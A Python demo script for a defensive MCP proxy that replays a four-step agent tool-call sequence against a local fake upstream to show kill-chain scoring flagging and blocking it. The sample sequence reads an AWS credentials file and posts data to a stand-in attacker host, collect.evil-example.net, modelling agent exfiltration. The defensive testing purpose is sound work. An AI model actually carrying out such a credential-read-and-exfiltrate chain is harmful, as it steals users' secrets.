"""Live kill-chain demo: real proxy + fake upstream over HTTP.

Run from the relayshield repo root:

    python3 kill-chain-demo/demo_kill_chain.py

Starts a fake MCP upstream and the mcp_proxy package (kill-chain
sequence scoring on, defaults: flag at 40, block at 85), then runs
the four-call replay from the kill-chain wiring note:

    1. list_files   {"path": "/data"}                    recon, forwarded
    2. read_file    {"path": "/home/u/.aws/credentials"} access, FLAG (45)
    3. base64_encode {"data": "payload"}                 staging (65), forwarded
    4. http_post    {"url": "https://collect.evil-example.net/drop",
                     "data": "x"}                        exfil, BLOCKED (95)

Then prints the GET /_rs/killchain history view (24h window) and the
audit file location. Everything runs on 127.0.0.1 ports 18711/18712
and writes only to a temp dir.
"""
import json
import os
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
UP_PORT, PX_PORT = 18711, 18712
UP = f"http://127.0.0.1:{UP_PORT}/mcp"
PX = f"http://127.0.0.1:{PX_PORT}"

tmp = tempfile.mkdtemp(prefix="rs-killchain-demo-")
audit = os.path.join(tmp, "audit.jsonl")
count = os.path.join(tmp, "upstream_count")
procs = []


def start(cmd, env=None, cwd=None):
    p = subprocess.Popen(cmd, env=env, cwd=cwd,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    procs.append(p)
    return p


def post(url, payload):
    req = urllib.request.Request(
        url, data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        body = e.read()
        try:
            return e.code, json.loads(body or b"{}")
        except Exception:
            return e.code, {"raw": body.decode(errors="replace")[:200]}


def get(url):
    with urllib.request.urlopen(url, timeout=10) as r:
        return json.loads(r.read() or b"{}")


try:
    start([sys.executable, os.path.join(HERE, "fake_upstream.py"),
           str(UP_PORT), count])
    env = dict(os.environ)
    env.update({
        "PYTHONPATH": ROOT,
        "MCP_PROXY_UPSTREAM": UP, "MCP_PROXY_PORT": str(PX_PORT),
        "MCP_PROXY_SCREENING": "false", "MCP_PROXY_RESULT_SCREENING": "true",
        "MCP_PROXY_BEHAVIOR": "false", "MCP_PROXY_POLICY_FILE": "",
        "MCP_PROXY_AUDIT_FILE": audit, "MCP_PROXY_KILL_CHAIN": "true",
    })
    start([sys.executable, "-m", "mcp_proxy"], env=env, cwd=ROOT)
    for _ in range(50):
        try:
            get(PX + "/_rs/killchain")
            break
        except Exception:
            time.sleep(0.3)
    post(PX, {"jsonrpc": "2.0", "id": 0, "method": "initialize",
              "params": {}})
    steps = [
        ("list_files", {"path": "/data"}),
        ("read_file", {"path": "/home/u/.aws/credentials"}),
        ("base64_encode", {"data": "payload"}),
        ("http_post", {"url": "https://collect.evil-example.net/drop",
                       "data": "x"}),
    ]
    for i, (name, args) in enumerate(steps, 1):
        status, resp = post(PX, {"jsonrpc": "2.0", "id": i,
                                 "method": "tools/call",
                                 "params": {"name": name,
                                            "arguments": args}})
        err = resp.get("error") or {}
        verdict = (err.get("data") or {}).get("verdict") or {}
        outcome = ("BLOCKED" if err.get("code") == -32001
                   else "forwarded")
        print(f"call {i} {name}: HTTP {status} {outcome} "
              f"error_code={err.get('code')} "
              f"category={verdict.get('poison_category') or ''}")
    print("killchain 24h:", json.dumps(get(PX + "/_rs/killchain?window=24h")))
    hits = 0
    if os.path.exists(count):
        with open(count) as f:
            hits = len(f.read().splitlines())
    print(f"upstream tools/call hits: {hits} (expect 3: the blocked call "
          f"never reaches the upstream)")
    print(f"audit file: {audit}")
    print(f"kill-chain history sits beside it as "
          f"{os.path.join(tmp, 'kill_chain_history.jsonl')} if configured, "
          f"else under ~/.relayshield")
finally:
    for p in procs:
        p.terminate()
